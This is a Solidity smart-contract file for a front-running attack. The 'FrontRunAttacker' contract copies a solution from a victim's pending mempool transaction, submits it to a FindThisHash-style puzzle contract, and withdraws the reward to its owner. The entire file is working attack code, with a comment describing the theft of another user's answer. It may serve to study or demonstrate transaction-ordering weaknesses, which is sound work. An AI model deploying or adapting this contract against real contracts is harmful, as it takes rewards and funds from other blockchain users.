pragma solidity ^0.4.22;

interface IFindThisHash {
    function solve(string solution) external;
}

contract FrontRunAttacker {
    address owner;
    IFindThisHash target;

    constructor(address _target) public {
        owner = msg.sender;
        target = IFindThisHash(_target);
    }

    // This should be called with the same 'solution' seen in the victim's mempool tx
    function frontRunSolve(string solution) public {
        require(msg.sender == owner);
        target.solve(solution);
    }

    // Allow contract to receive reward
    function() external payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

